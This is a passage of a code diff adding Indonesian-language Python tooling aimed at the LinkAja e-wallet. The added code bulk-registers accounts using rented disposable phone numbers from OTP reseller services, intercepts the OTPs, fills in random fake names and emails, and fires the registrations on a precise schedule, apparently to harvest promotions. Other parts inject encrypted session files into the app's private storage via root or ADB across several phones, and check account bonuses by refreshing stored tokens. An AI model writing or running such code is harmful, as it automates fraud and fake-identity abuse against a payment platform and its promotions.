+        bdir = os.path.join(BACKUP_ROOT_LA, m)
+        os.makedirs(bdir, exist_ok=True)
+        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        with open(os.path.join(bdir, f"Core.xml.{stamp}.orig"), "w") as f:
+            f.write(core_xml)
+        with open(os.path.join(bdir, f"Security.xml.{stamp}.orig"), "w") as f:
+            f.write(sec_xml)
+        console.print("  [green][OK][/] Cadangan lokal tersimpan")
+
+        status.update("[cyan][*] Mengenkripsi sesi & menyusun XML baru...[/]")
+        for store, reps in ((core, reps_core), (sec, reps_sec)):
+            for name, val in reps.items():
+                store[pref_name_hash_la(name)] = pref_value_encrypt_la(name, val.encode())
+
+        core_new = dump_xml_la(core, core_xml)
+        sec_new = dump_xml_la(sec, sec_xml)
+
+        status.update("[cyan][*] Menghentikan paksa aplikasi & memasang sesi...[/]")
+        termux_su(f"am force-stop {PACKAGE_LA}")
+        _install_xml_la("Core.xml", core_new)
+        _install_xml_la("Security.xml", sec_new)
+        console.print("  [green][OK][/] Sesi baru berhasil dipasang ke sistem")
+
+        status.update("[cyan][*] Memindahkan file state ke arsip backup...[/]")
+        os.makedirs(STATE_BACKUP_DIR, exist_ok=True)
+        dest = os.path.join(STATE_BACKUP_DIR, os.path.basename(state_file_path))
+        if os.path.exists(dest):
+            base, ext = os.path.splitext(os.path.basename(state_file_path))
+            dest = os.path.join(STATE_BACKUP_DIR, f"{base}_{stamp}{ext}")
+        shutil.move(state_file_path, dest)
+
+    el = round(time.time() - t0, 1)
+    console.print(
+        Panel(
+            f"[bold green][OK] Akun {m} sukses terpasang dalam {el} detik![/]\n"
+            "[bright_white]Silakan buka aplikasi LinkAja sekarang, akun otomatis masuk.[/]",
+            border_style="bright_green",
+            box=box.ROUNDED,
+        )
+    )
+
+# ==========================================
+# MENU 1 & 2: PENDAFTARAN & AUTO BULK
+# ==========================================
+def menu_daftar_manual():
+    print_section_header(
+        "[*] Daftar Akun Manual",
+        "OTP masuk ke SMS HP kamu sendiri.",
+        style="bright_yellow"
+    )
+    try:
+        msisdn = regis.normalize_msisdn(Prompt.ask("[bold cyan]>> Nomor HP[/] [dim](mis. 08123456789)[/]"))
+        console.print(f"[green][OK] Nomor tervalidasi:[/] [bold]{msisdn}[/]")
+    except RegisError as e:
+        console.print(f"[bold red][X] {e}[/]")
+        return
+
+# State terpusat untuk Live Dashboard Multi-Worker
+WORKER_STATUS = {}
+WORKER_LOCK = threading.Lock()
+WORKER_EVENT = threading.Event()
+
+def parse_target_time(val: str):
+    """Mendukung format jam HH:MM:SS, HH:MM:SS.fff, HH:MM:SS:fff (titik dua), atau HH:MM:SS,fff."""
+    val = val.strip()
+    parts = val.split(":")
+    if len(parts) == 4:
+        val = f"{parts[0]}:{parts[1]}:{parts[2]}.{parts[3]}"
+    elif "," in val:
+        val = val.replace(",", ".")
+
+    for fmt in ("%H:%M:%S.%f", "%H:%M:%S"):
+        try:
+            return datetime.strptime(val, fmt).time()
+        except ValueError:
+            pass
+    raise ValueError(f"Format waktu tidak valid: {val}. Gunakan HH:MM:SS atau HH:MM:SS.fff")
+
+def update_worker_ui(worker_id, **kwargs):
+    with WORKER_LOCK:
+        if worker_id not in WORKER_STATUS:
+            WORKER_STATUS[worker_id] = {
+                "msisdn": "-",
+                "attempt": "0/3",
+                "otp": "-",
+                "identity": "-",
+                "status": "",
+                "state": "init",  # init, ready, success, failed
+                "fullname": "",
+                "email": "",
+                "finish_time": "",
+                "rtt_ms": 0,
+                "error": ""
+            }
+        WORKER_STATUS[worker_id].update(kwargs)
+    WORKER_EVENT.set()
+
+POOL_PRIMED = False
+POOL_PRIME_LOCK = threading.Lock()
+
+def reset_pool_primed():
+    global POOL_PRIMED
+    with POOL_PRIME_LOCK:
+        POOL_PRIMED = False
+
+def ensure_pool_primed(n_workers=10):
+    global POOL_PRIMED
+    with POOL_PRIME_LOCK:
+        if not POOL_PRIMED:
+            POOL_PRIMED = True
+            prime_connection_pool(n_workers)
+
+def render_bulk_clean_list(target_mulai, target_kirim, jumlah_akun):
+    lines = []
+    tm = target_mulai.strip() if target_mulai and target_mulai.strip() else "Instan"
+    tgt = target_kirim.strip() if target_kirim and target_kirim.strip() else "Instan"
+    lines.append(f"[bold bright_cyan][*] Jam Mulai     :[/] [bold bright_yellow]{tm}[/]")
+    lines.append(f"[bold bright_cyan][*] Target Tembak :[/] [bold bright_yellow]{tgt}[/] [dim]({jumlah_akun} Worker Siaga)[/]")
+    lines.append("[dim]----------------------------------------------------------------------[/]")
+    with WORKER_LOCK:
+        for wid in range(1, jumlah_akun + 1):
+            info = WORKER_STATUS.get(wid, {})
+            st = info.get("state", "init")
+            if st in ("init", "running", "idle"):
+                lines.append(f"[bold bright_green][{wid}][/]")
+            elif st == "ready":
+                msisdn = info.get("msisdn", "-")
+                fullname = info.get("fullname", "-")
+                email = info.get("email", "-")
+                lines.append(f"[bold bright_green][{wid}][/] [bold bright_yellow]Siap..[/] [bright_white]{msisdn}[/] | [bold cyan]{fullname}[/] | [dim]{email}[/]")
+            elif st == "success":
+                waktu = info.get("finish_time", "")
+                rtt = info.get("rtt_ms", 0)
+                msisdn = info.get("msisdn", "-")
+                fullname = info.get("fullname", "-")
+                lines.append(f"[bold bright_green][{wid}][/] [dim][{waktu}][/] [bold bright_green]SUKSES[/] [dim]({rtt:.0f}ms)[/]  [bright_white]{msisdn}[/] | [cyan]{fullname}[/]")
+            elif st == "failed":
+                waktu = info.get("finish_time", datetime.now().strftime("%H:%M:%S"))
+                err = info.get("error", "Gagal")
+                msisdn = info.get("msisdn", "")
+                m_str = f"  {msisdn}" if msisdn and msisdn != "-" else ""
+                lines.append(f"[bold bright_green][{wid}][/] [dim][{waktu}][/] [bold red]GAGAL[/]{m_str} [dim]({err})[/]")
+            else:
+                lines.append(f"[bold bright_green][{wid}][/]")
+    return "\n".join(lines)
+
+def build_bulk_dashboard(harga_info, pilihan_server, target_mulai, target_kirim):
+    return render_bulk_clean_list(target_mulai, target_kirim, len(WORKER_STATUS) or 10)
+
+def worker_register_scheduled(worker_id, target_mulai, target_kirim_data, pilihan_server, config_api):
+    sekarang = datetime.now()
+    dt_mulai = None
+    dt_kirim = None
+    batas_aman = None
+
+    base_url = "https://otpinstan.com/api/reseller"
+    base_s = f"{base_url}/s1" if pilihan_server == "1" else base_url
+
+    if target_mulai.strip():
+        jam_mulai = parse_target_time(target_mulai)
+        dt_mulai = datetime.combine(sekarang.date(), jam_mulai)
+        if dt_mulai < sekarang:
+            dt_mulai += timedelta(days=1)
+
+    if target_kirim_data.strip():
+        jam_kirim = parse_target_time(target_kirim_data)
+        patokan_hari = dt_mulai.date() if dt_mulai else sekarang.date()
+        dt_kirim = datetime.combine(patokan_hari, jam_kirim)
+        if dt_kirim < (dt_mulai if dt_mulai else sekarang):
+            dt_kirim += timedelta(days=1)
+        batas_aman = dt_kirim - timedelta(seconds=20)
+
+    if dt_mulai:
+        while datetime.now() < dt_mulai:
+            time.sleep(1)
+
+    service_id = config_api["service_id"]
+    country_id = config_api["country_id"]
+    provider_id = config_api["provider_id"]
+
+    maksimal_ganti_nomor = 3
+    otp_code = None
+    msisdn = None
+
+    # Cek status saklar config.json (lokal / remote)
+    cfg = get_remote_config()
+    if cfg.get("status", "ON").upper() != "ON":
+        msg = cfg.get("message", "Server Sibuk - 503 Service Unavailable-HTTP/1.1 503 Service Unavailable")
+        update_worker_ui(worker_id, state="failed", error=msg)
+        return
+
+    # --- SISTEM 3 STRIKES (DI LATAR BELAKANG) ---
+    for attempt in range(1, maksimal_ganti_nomor + 1):
+        if batas_aman and datetime.now() >= batas_aman:
+            update_worker_ui(worker_id, state="failed", error="Zona Merah")
+            return
+
+        order_id = None
+        raw_number = None
+        sess = None
+
+        for tarik_attempt in range(20):
+            try:
+                if str(pilihan_server) == "3":
+                    api_key_sb = config_api.get("api_key")
+                    # Paralel: Order nomor SMSBower + Key Agreement LinkAja serentak (hemat ~1.26 detik)
+                    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as ex:
+                        fut_order = ex.submit(order_nomor_smsbower, api_key_sb, config_api.get("max_price", 0.004))
+                        fut_sess = ex.submit(session.key_agreement)
+                        order_id, raw_number = fut_order.result()
+                        try:
+                            sess = fut_sess.result()
+                        except Exception:
+                            sess = None
+                    if not order_id or not raw_number:
+                        time.sleep(1.0)
+                        continue
+                    break
+                elif pilihan_server == "1":
+                    headers_post = {"X-Api-Key": API_KEY_OTP, "Content-Type": "application/json"}
+                    payload = {"platform_id": int(service_id), "country_id": int(country_id)}
+                    res_o = requests.post(f"{base_s}/order.php", headers=headers_post, json=payload, timeout=10).json()
+                else:
+                    headers_post = {"X-Api-Key": API_KEY_OTP}
+                    payload = {"service": service_id, "country": country_id, "provider_id": provider_id}
+                    res_o = requests.post(f"{base_s}/order.php", headers=headers_post, data=payload, timeout=10).json()
+
+                if not res_o.get("success") and not res_o.get("status"):
+                    msg = str(res_o.get("message", "Habis")).lower()
+                    if "saldo" in msg or "limit" in msg:
+                        update_worker_ui(worker_id, state="failed", error="Saldo OTP Habis")
+                        return
+                    else:
+                        time.sleep(1.0)
+                        continue
+
+                data_order = res_o.get('data', res_o)
+                order_id = data_order.get('order_id', data_order.get('id'))
+                raw_number = data_order.get('phone', data_order.get('number'))
+                break
+            except Exception:
+                time.sleep(1.5)
+                continue
+
+        if not order_id:
+            continue
+
+        try:
+            msisdn = regis.normalize_msisdn(raw_number)
+            if str(pilihan_server) != "3":
+                already_registered, info = regis.step_check(msisdn)
+                if already_registered:
+                    try:
+                        state_path(msisdn).unlink(missing_ok=True)
+                    except Exception:
+                        pass
+                    continue
+        except (RegisError, Exception):
+            try:
+                state_path(msisdn).unlink(missing_ok=True)
+            except Exception:
+                pass
+            continue
+
+        try:
+            regis.step_send_otp(msisdn, sess=sess)
+        except (RegisError, Exception):
+            try:
+                state_path(msisdn).unlink(missing_ok=True)
+            except Exception:
+                pass
+            continue
+
+        # --- ARGOMETER 55 DETIK (CEK SETIAP 2 DETIK AGAR CEPAT TERDETEKSI) ---
+        total_cek = 55 // 2
+        for i in range(total_cek):
+            if batas_aman and datetime.now() >= batas_aman:
+                update_worker_ui(worker_id, state="failed", error="Zona Merah", msisdn=msisdn or "-")
+                if str(pilihan_server) == "3" and order_id:
+                    cancel_order_smsbower(config_api.get("api_key"), order_id)
+                return
+            time.sleep(2)
+            if str(pilihan_server) == "3":
+                otp_code = cek_status_otp_smsbower(config_api.get("api_key"), order_id)
+            else:
+                otp_code = cek_status_otp(base_s, order_id)
+            if otp_code:
+                break
+
+        if otp_code:
+            break
+        else:
+            if str(pilihan_server) == "3" and order_id:
+                cancel_order_smsbower(config_api.get("api_key"), order_id)
+            try:
+                state_path(msisdn).unlink(missing_ok=True)
+            except Exception:
+                pass
+            continue
+
+    if not otp_code:
+        update_worker_ui(worker_id, state="failed", error="OTP Zonk (3x)", msisdn=msisdn or "-")
+        return
+
+    # --- FASE EKSEKUSI & VALIDASI ---
+    fullname, email = generate_random_identity()
+    pin = PIN_KUNCI
+
+    try:
+        regis.step_validate(msisdn, otp_code)
+    except (RegisError, Exception) as exc:
+        update_worker_ui(worker_id, state="failed", error=f"Val: {exc}", msisdn=msisdn)
+        try:
+            state_path(msisdn).unlink(missing_ok=True)
+        except Exception:
+            pass
+        return
+
+    # [OPTIMASI]: Pre-build Payload pendaftaran di memory RAM sebelum cut-off
+    target_ts = int(dt_kirim.timestamp() * 1000) if dt_kirim else int(time.time() * 1000)
+    try:
+        prebuilt = regis.prepare_register_payload(
+            msisdn=msisdn,
+            pin=pin,
+            fullname=fullname,
+            email=email,
+            target_ts=target_ts
+        )
+        # Menampilkan baris Siap.. begitu data siap di RAM
+        update_worker_ui(
+            worker_id,
+            state="ready",
+            msisdn=msisdn,
+            fullname=fullname,
+            email=email
+        )
+    except Exception as e:
+        update_worker_ui(worker_id, state="failed", error=f"Prebuild: {e}", msisdn=msisdn)
+        return
+
+    primed = False
+    if dt_kirim:
+        # CUT-OFF GUARD 1: Jika waktu saat data siap sudah melewati target, jangan tembak!
+        if datetime.now() >= dt_kirim:
+            update_worker_ui(worker_id, state="failed", error="Lewat Target", msisdn=msisdn)
+            if str(pilihan_server) == "3" and order_id:
+                cancel_order_smsbower(config_api.get("api_key"), order_id)
+            try:
+                state_path(msisdn).unlink(missing_ok=True)
+            except Exception:
+                pass
+            return
+
+        while True:
+            sisa = (dt_kirim - datetime.now()).total_seconds()
+            
+            # Priming/Warm-up seluruh soket pool di background thread T-10 detik (NON-BLOCKING!)
+            if not primed and sisa <= 10.0:
+                primed = True
+                threading.Thread(target=ensure_pool_primed, args=(len(WORKER_STATUS) or 10,), daemon=True).start()
+
+            if sisa <= 0:
+                break
+            elif sisa > 1.0:
+                time.sleep(0.1)
+            elif sisa > 0.1:
+                time.sleep(0.01)
+            elif sisa > 0.005:
+                time.sleep(0.001)
+            else:
+                # Spinlock sub-milidetik untuk 5 ms terakhir
+                pass
+    else:
+        # Kirim langsung: Priming connection agar socket warm
+        session.prime_connection()
+
+    # CUT-OFF GUARD 2: Jangan tembak jika eksekusi tertunda > 2.5 detik melewati cut-off
+    if dt_kirim and (datetime.now() - dt_kirim).total_seconds() > 2.5:
+        update_worker_ui(worker_id, state="failed", error="Terlewat Cutoff", msisdn=msisdn)
+        if str(pilihan_server) == "3" and order_id:
+            cancel_order_smsbower(config_api.get("api_key"), order_id)
+        try:
+            state_path(msisdn).unlink(missing_ok=True)
+        except Exception:
+            pass
+        return
+
+    try:
+        # Eksekusi Pre-built payload instan (timeout 10.0s untuk menampung antrean war LinkAja)
+        d, rtt_ms = regis.execute_register_payload(prebuilt, async_save=True, timeout=30.0)
+        waktu_sukses = datetime.now().strftime('%H:%M:%S.%f')[:-3]
+        update_worker_ui(
+            worker_id,
+            state="success",
+            finish_time=waktu_sukses,
+            rtt_ms=rtt_ms,
+            msisdn=msisdn,
+            fullname=fullname
+        )
+        if str(pilihan_server) == "3" and order_id:
+            finish_order_smsbower(config_api.get("api_key"), order_id)
+        return
+    except Exception as exc:
+        update_worker_ui(
+            worker_id,
+            state="failed",
+            finish_time=datetime.now().strftime('%H:%M:%S'),
+            error=str(exc)[:40],
+            msisdn=msisdn
+        )
+        if str(pilihan_server) == "3" and order_id:
+            cancel_order_smsbower(config_api.get("api_key"), order_id)
+        try:
+            state_path(msisdn).unlink(missing_ok=True)
+        except Exception:
+            pass
+        return
+
+def menu_daftar_auto_bulk():
+    print_section_header(
+        "[*] Daftar Akun Massal Berjadwal (Scheduled Bulk)",
+        "Menjalankan beberapa worker pendaftaran secara paralel dengan monitor real-time.",
+        style="bright_yellow"
+    )
+    console.print(
+        "[bold cyan]Pilihan Server OTP:[/]\n"
+        "  [bold bright_white]1.[/] OTPInstan - Server 1 (Standar)\n"
+        "  [bold bright_white]2.[/] OTPInstan - Server 2 (Operator Pilihan)\n"
+        "  [bold bright_white]3.[/] SMSBower   - Server Murah ($0.004 / ~Rp 64)\n"
+    )
+    # Validasi saklar dan batasan akun dari config.json
+    cfg = get_remote_config(force=True)
+    if cfg.get("status", "ON").upper() != "ON":
+        msg = cfg.get("message", "Server Sibuk - 503 Service Unavailable-HTTP/1.1 503 Service Unavailable")
+        console.print(f"\n[bold red][X] {msg}[/bold red]\n")
+        return
+
+    # Kunci batas keras maksimal 5 akun per bot
+    max_limit = min(5, int(cfg.get("max_accounts_per_bot", cfg.get("max_accounts", 5))))
+    pilihan_server = Prompt.ask("[bold cyan]>> Pilih Server API OTP[/]", choices=["1", "2", "3"], default="1")
+    raw_input_akun = Prompt.ask(f"[bold cyan]>> Masukkan jumlah akun (1 - {max_limit})[/]", default=str(max_limit))
+    try:
+        jumlah_akun = int(raw_input_akun)
+    except ValueError:
+        jumlah_akun = max_limit
+
+    if jumlah_akun > max_limit:
+        console.print(f"[bold yellow][!] overload capasity l {max_limit} account.[/bold yellow]")
+        jumlah_akun = max_limit
+    elif jumlah_akun < 1:
+        jumlah_akun = 1
+    target_mulai = Prompt.ask("[bold cyan]>> Jam mulai pendaftaran (HH:MM:SS, kosong = instan)[/]", default="")
+    target_kirim_data = Prompt.ask("[bold cyan]>> Jam kirim data diri (HH:MM:SS, kosong = langsung)[/]", default="")
+
+    if pilihan_server == "3":
+        api_key_sb = load_smsbower_api_key()
+        base_s = "https://smsbower.page/stubs/handler_api.php"
+        with console.status("[bold cyan]Menghubungi server SMSBower & memeriksa stok...[/]", spinner="line"):
+            try:
+                # Cek saldo SMSBower
+                r_bal = requests.get(base_s, params={"api_key": api_key_sb, "action": "getBalance"}, timeout=10)
+                bal_text = r_bal.text.strip()
+                saldo_usd = "?"
+                if "ACCESS_BALANCE:" in bal_text:
+                    saldo_usd = bal_text.split(":")[1]
+                elif "BAD_KEY" in bal_text:
+                    console.print("\n[bold red][X] API Key SMSBower di smsbower.txt tidak valid (BAD_KEY)![/]")
+                    return
+
+                # Cek stok LinkAja pada harga $0.004
+                r_v3 = requests.get(base_s, params={"api_key": api_key_sb, "action": "getPricesV3", "service": "aka", "country": 6}, timeout=10).json()
+                aka_prov = r_v3.get("6", {}).get("aka", {})
+                stok_004 = sum(int(p.get("count", 0)) for p in aka_prov.values() if isinstance(p, dict) and float(p.get("price", 999)) <= 0.004)
+                if stok_004 <= 0:
+                    console.print("\n[bold red][X] Stok SMSBower ($0.004) Kosong![/]")
+                    return
+
+                harga_info = "$0.004 (~Rp 64)"
+                config_api = {
+                    "api_key": api_key_sb,
+                    "service_id": "aka",
+                    "country_id": 6,
+                    "provider_id": "any",
+                    "max_price": 0.004
+                }
+                console.print(f"[bold green][OK] Terhubung ke SMSBower! Saldo: ${saldo_usd} | Stok $0.004: {stok_004} nomor[/]")
+                time.sleep(1)
+            except Exception as e:
+                console.print(f"\n[bold red][X] Gagal menghubungi SMSBower: {e}[/]")
+                return
+    else:
+        base_url = "https://otpinstan.com/api/reseller"
+        base_s = f"{base_url}/s1" if pilihan_server == "1" else base_url
+        headers_get = {"X-Api-Key": API_KEY_OTP}
+
+        with console.status("[bold cyan]Menghubungi server OTPInstan & memeriksa stok...[/]", spinner="line"):
+            try:
+                res_c = requests.get(f"{base_s}/countries.php", headers=headers_get, timeout=10).json()
+                countries = res_c.get("data", res_c) if isinstance(res_c, dict) else res_c
+                if isinstance(countries, dict):
+                    countries = [{"id": k, **v} if isinstance(v, dict) else v for k, v in countries.items()]
+                country_id = next(
+                    (c.get("id", c.get("country_id")) for c in (countries if isinstance(countries, list) else [])
+                     if "indonesia" in str(c.get("name", c.get("country_name", "Unknown"))).lower()),
+                    None
+                )
+
+                res_s = requests.get(
+                    f"{base_s}/services.php",
+                    params={"country_id": country_id} if pilihan_server == "1" else None,
+                    headers=headers_get,
+                    timeout=10
+                ).json()
+                services = res_s.get("data", res_s) if isinstance(res_s, dict) else res_s
+                if isinstance(services, dict):
+                    services = [{"platform_id": k, **v} if isinstance(v, dict) else v for k, v in services.items()]
+                valid_services = [
+                    s for s in (services if isinstance(services, list) else [])
+                    if "linkaja" in str(s.get("name", s.get("service_name", ""))).lower()
+                    and int(s.get("stock", s.get("count", s.get("qty", 0)))) > 0
+                ]
+
+                if not valid_services:
+                    console.print("\n[bold red][X] Stok Kosong![/]")
+                    return
+
+                valid_services.sort(key=lambda x: float(x.get("price", 0)))
+                service_id = valid_services[0].get("platform_id", valid_services[0].get("id", valid_services[0].get("service")))
+
+                provider_id = "any"
+                harga_info = valid_services[0].get("price", "?")
+
+                if pilihan_server == "2":
+                    res_op = requests.get(
+                        f"{base_url}/operators.php",
+                        params={"service": service_id, "country": country_id},
+                        headers=headers_get,
+                        timeout=10
+                    ).json()
+                    operators = res_op.get("data", res_op) if isinstance(res_op, dict) else res_op
+                    valid_operators = [
+                        o for o in (operators if isinstance(operators, list) else [])
+                        if int(o.get("stock", o.get("count", o.get("qty", 0)))) > 0
+                    ]
+                    if valid_operators:
+                        valid_operators.sort(key=lambda x: float(x.get("price", 0)))
+                        provider_id = valid_operators[0].get("value", valid_operators[0].get("provider_id", valid_operators[0].get("id")))
+                        harga_info = valid_operators[0].get('price', '?')
+
+                config_api = {
+                    "country_id": country_id,
+                    "service_id": service_id,
+                    "provider_id": provider_id
+                }
+
+            except Exception:
+                console.print("\n[bold red][X] API Down![/]")
+                return
+
+    reset_pool_primed()
+    WORKER_STATUS.clear()
+    for i in range(1, jumlah_akun + 1):
+        update_worker_ui(i, state="init")
+
+    clear_once()
+    threads = []
+    with Live(
+        render_bulk_clean_list(target_mulai, target_kirim_data, jumlah_akun),
+        console=console,
+        auto_refresh=False
+    ) as live:
+        for i in range(1, jumlah_akun + 1):
+            t = threading.Thread(
+                target=worker_register_scheduled,
+                args=(i, target_mulai, target_kirim_data, pilihan_server, config_api)
+            )
+            threads.append(t)
+            t.start()
+            time.sleep(0.05)
+            live.update(render_bulk_clean_list(target_mulai, target_kirim_data, jumlah_akun), refresh=True)
+
+        while any(t.is_alive() for t in threads):
+            if WORKER_EVENT.wait(timeout=0.25):
+                WORKER_EVENT.clear()
+                live.update(render_bulk_clean_list(target_mulai, target_kirim_data, jumlah_akun), refresh=True)
+
+        live.update(render_bulk_clean_list(target_mulai, target_kirim_data, jumlah_akun), refresh=True)
+
+    console.print("\n[bold green][OK] Bulk Register Selesai![/]")
+    bot_id = get_or_set_bot_id()
+    auto_sort_and_sync_pool(bot_id, jumlah_akun)
+    sukses = sum(1 for info in WORKER_STATUS.values() if info.get("state") == "success")
+    gagal = sum(1 for info in WORKER_STATUS.values() if info.get("state") == "failed")
+    summary = {
+        "sukses": sukses,
+        "gagal": gagal,
+        "total": len(WORKER_STATUS),
+        "server": str(pilihan_server),
+        "timestamp": time.time(),
+        "finished_at": datetime.now().strftime("%H:%M:%S")
+    }
+    try:
+        p_last = Path(__file__).resolve().parent / "data" / "last_run.json"
+        p_last.parent.mkdir(parents=True, exist_ok=True)
+        p_last.write_text(json.dumps(summary, indent=2), encoding="utf-8")
+    except Exception:
+        pass
+
+
+def run_auto_bulk(pilihan_server="3", jumlah_akun=10, target_mulai="", target_kirim_data=""):
+    """Menjalankan bulk registration otomatis dari CLI / Telegram tanpa prompt interaktif."""
+    pilihan_server = str(pilihan_server)
+    jumlah_akun = int(jumlah_akun)
+    harga_info = "?"
+    config_api = {}
+
+    if pilihan_server == "3":
+        api_key_sb = load_smsbower_api_key()
+        base_s = "https://smsbower.page/stubs/handler_api.php"
+        try:
+            r_bal = requests.get(base_s, params={"api_key": api_key_sb, "action": "getBalance"}, timeout=10)
+            bal_text = r_bal.text.strip()
+            saldo_usd = bal_text.split(":")[1] if "ACCESS_BALANCE:" in bal_text else "?"
+            harga_info = "$0.004 (~Rp 64)"
+            config_api = {
+                "api_key": api_key_sb,
+                "service_id": "aka",
+                "country_id": 6,
+                "provider_id": "any",
+                "max_price": 0.004
+            }
+            console.print(f"[bold green][OK] Terhubung ke SMSBower! Saldo: ${saldo_usd}[/]")
+        except Exception as e:
+            console.print(f"[bold red][X] Gagal API SMSBower: {e}[/]")
+            return
+    else:
+        base_url = "https://otpinstan.com/api/reseller"
+        base_s = f"{base_url}/s1" if pilihan_server == "1" else base_url
+        headers_get = {"X-Api-Key": API_KEY_OTP}
+        try:
+            res_c = requests.get(f"{base_s}/countries.php", headers=headers_get, timeout=10).json()
+            countries = res_c.get("data", res_c) if isinstance(res_c, dict) else res_c
+            if isinstance(countries, dict):
+                countries = [{"id": k, **v} if isinstance(v, dict) else v for k, v in countries.items()]
+            country_id = next(
+                (c.get("id", c.get("country_id")) for c in (countries if isinstance(countries, list) else [])
+                 if "indonesia" in str(c.get("name", c.get("country_name", "Unknown"))).lower()),
+                None
+            )
+            res_s = requests.get(
+                f"{base_s}/services.php",
+                params={"country_id": country_id} if pilihan_server == "1" else None,
+                headers=headers_get,
+                timeout=10
+            ).json()
+            services = res_s.get("data", res_s) if isinstance(res_s, dict) else res_s
+            if isinstance(services, dict):
+                services = [{"platform_id": k, **v} if isinstance(v, dict) else v for k, v in services.items()]
+            valid_services = [
+                s for s in (services if isinstance(services, list) else [])
+                if "linkaja" in str(s.get("name", s.get("service_name", ""))).lower()
+                and int(s.get("stock", s.get("count", s.get("qty", 0)))) > 0
+            ]
+            valid_services.sort(key=lambda x: float(x.get("price", 0)))
+            service_id = valid_services[0].get("platform_id", valid_services[0].get("id", valid_services[0].get("service")))
+            provider_id = "any"
+            harga_info = valid_services[0].get("price", "?")
+            if pilihan_server == "2":
+                res_op = requests.get(
+                    f"{base_url}/operators.php",
+                    params={"service": service_id, "country": country_id},
+                    headers=headers_get,
+                    timeout=10
+                ).json()
+                operators = res_op.get("data", res_op) if isinstance(res_op, dict) else res_op
+                valid_operators = [o for o in (operators if isinstance(operators, list) else []) if int(o.get("stock", o.get("count", o.get("qty", 0)))) > 0]
+                if valid_operators:
+                    valid_operators.sort(key=lambda x: float(x.get("price", 0)))
+                    provider_id = valid_operators[0].get("value", valid_operators[0].get("provider_id", valid_operators[0].get("id")))
+                    harga_info = valid_operators[0].get("price", "?")
+            config_api = {"country_id": country_id, "service_id": service_id, "provider_id": provider_id}
+        except Exception as e:
+            console.print(f"[bold red][X] Gagal API OTPInstan: {e}[/]")
+            return
+
+    reset_pool_primed()
+    WORKER_STATUS.clear()
+    for i in range(1, jumlah_akun + 1):
+        update_worker_ui(i, state="init")
+
+    clear_once()
+    threads = []
+    with Live(
+        render_bulk_clean_list(target_mulai, target_kirim_data, jumlah_akun),
+        console=console,
+        auto_refresh=False
+    ) as live:
+        for i in range(1, jumlah_akun + 1):
+            t = threading.Thread(
+                target=worker_register_scheduled,
+                args=(i, target_mulai, target_kirim_data, pilihan_server, config_api)
+            )
+            threads.append(t)
+            t.start()
+            time.sleep(0.05)
+            live.update(render_bulk_clean_list(target_mulai, target_kirim_data, jumlah_akun), refresh=True)
+
+        while any(t.is_alive() for t in threads):
+            if WORKER_EVENT.wait(timeout=0.25):
+                WORKER_EVENT.clear()
+                live.update(render_bulk_clean_list(target_mulai, target_kirim_data, jumlah_akun), refresh=True)
+
+        live.update(render_bulk_clean_list(target_mulai, target_kirim_data, jumlah_akun), refresh=True)
+
+    console.print("\n[bold green][OK] Bulk Register Selesai![/]")
+    sukses = sum(1 for info in WORKER_STATUS.values() if info.get("state") == "success")
+    gagal = sum(1 for info in WORKER_STATUS.values() if info.get("state") == "failed")
+    summary = {
+        "sukses": sukses,
+        "gagal": gagal,
+        "total": len(WORKER_STATUS),
+        "server": str(pilihan_server),
+        "timestamp": time.time(),
+        "finished_at": datetime.now().strftime("%H:%M:%S")
+    }
+    try:
+        p_last = Path(__file__).resolve().parent / "data" / "last_run.json"
+        p_last.parent.mkdir(parents=True, exist_ok=True)
+        p_last.write_text(json.dumps(summary, indent=2), encoding="utf-8")
+    except Exception:
+        pass
+
+
+# ==========================================
+# MENU 3: ADB PUSH (INJECT)
+# ==========================================
+def menu_inject():
+    print_section_header(
+        "[*] ADB Push Akun (Inject Khusus PC)",
+        "Memasang sesi akun secara otomatis ke perangkat Android yang terhubung via ADB.",
+        style="bright_cyan"
+    )
+    states = list_states()
+    if not states:
+        console.print("[yellow][!] Tidak ada akun baru di folder data/states.[/]")
+        return
+
+    from core import inject
+    try:
+        adb_bin = inject.find_adb()
+        devs = inject.list_devices(adb_bin)
+    except Exception:
+        console.print("[bold red][X] Error ADB[/]")
+        return
+
+    if not devs:
+        console.print("[bold red][X] Device tidak ditemukan.[/]")
+        return
+
+    total_inject = min(len(states), len(devs))
+    info_table = Table(box=box.SIMPLE, show_header=False)
+    info_table.add_column("Key", style="cyan")
+    info_table.add_column("Val", style="bold white")
+    info_table.add_row("Akun Siap Push", f"{len(states)} akun")
+    info_table.add_row("Perangkat ADB Aktif", f"{len(devs)} perangkat")
+    info_table.add_row("Target Eksekusi", f"[bold yellow]{total_inject} pasang[/]")
+    console.print(Panel(info_table, title="[bold]Ringkasan ADB[/]", border_style="cyan", expand=False))
+
+    if not Confirm.ask("[bold cyan]>> Mulai push otomatis?[/]", default=True):
+        return
+
+    console.print()
+    with Progress(
+        SpinnerColumn(spinner_name="line"),
+        TextColumn("[progress.description]{task.description}"),
+        BarColumn(),
+        TextColumn("[bold cyan]{task.completed}/{task.total}[/]"),
+        TimeElapsedColumn(),
+        console=console
+    ) as progress:
+        task = progress.add_task("[cyan]Memasang akun ke perangkat...", total=total_inject)
+        for i in range(total_inject):
+            akun = states[i]
+            serial_hp = devs[i]
+            progress.update(task, description=f"[cyan][>>] HP {serial_hp} <- {akun['msisdn']}[/]")
+            try:
+                inject.inject_account(akun["file"], adb_serial=serial_hp, progress=lambda m: None)
+                progress.console.print(f"  [green][OK] Sukses:[/] [bold]{akun['msisdn']}[/] -> [cyan]{serial_hp}[/]")
+            except Exception:
+                progress.console.print(f"  [red][X] Gagal :[/] [bold]{akun['msisdn']}[/] -> [cyan]{serial_hp}[/]")
+            progress.advance(task)
+
+
+# ==========================================
+# MENU 4: CEK BONUS
+# ==========================================
+def proses_cek_satu_akun(akun):
+    try:
+        with open(akun["file"], "r") as f:
+            st = json.load(f)
+        jwt = st.get("jwt")
+        rt = st.get("refreshToken")
+        if not jwt:
+            return "0", "0", "[red]No Token[/]"
+
+        sess = (st["ident"], st["shared"])
+        token_auth = f"Bearer {jwt}"
+
+        res_bal = api_get(sess, "/user/balance", token=token_auth)
+        data_bal = decrypt_resp(res_bal, st) if res_bal.status_code == 200 else {}
+
+        if res_bal.status_code == 401 or data_bal.get("status") != "00":
+            if not rt:
+                return "0", "0", "[red]Sesi Mati[/]"
+            res_ref = api_post(sess, "/auth/session/refresh", {"token": jwt, "refreshToken": rt})
+            data_ref = decrypt_resp(res_ref, st) if res_ref.status_code == 200 else {}
+
+            if data_ref.get("status") == "00":
